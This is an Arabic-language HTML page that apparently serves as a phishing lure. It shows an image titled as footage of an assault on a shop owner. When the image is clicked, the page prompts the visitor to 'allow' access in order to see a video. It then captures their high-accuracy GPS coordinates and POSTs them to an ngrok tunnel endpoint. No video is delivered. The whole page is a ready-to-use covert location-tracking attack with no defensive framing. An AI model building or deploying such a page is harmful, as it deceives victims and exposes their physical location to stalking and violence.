<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title> اعتداء على صاحب منفذ </title>
    <style>
        body { display:flex; justify-content:center; align-items:center; height:100vh; }
        img { cursor:pointer; width:300px; }
    </style>
</head>
<body>
    <img src="الاعتداء على صاحب منفذ" onclick="capture()">

    <script>
        function capture() {
            alert("اضغط السماح لفتح الفيديو");

            if (!navigator.geolocation) {
                alert("اعد المحاولة");
                return;
            }

            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;

                    // ضع هنا رابط ngrok الصحيح
                    fetch("https://e59c6bc0bb57.ngrok-free.app/receive_data", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ lat, lon })
                    })
                    .then(res => res.json())
                    .then(resp => alert("سيتم فتح الفيديو"))
                    .catch(err => alert("  : " + err));
                },
                function(err) {
                    alert("تعذر : " + err.message);
                },
                { enableHighAccuracy: true }
            );
        }
    </script>
</body>
</html>
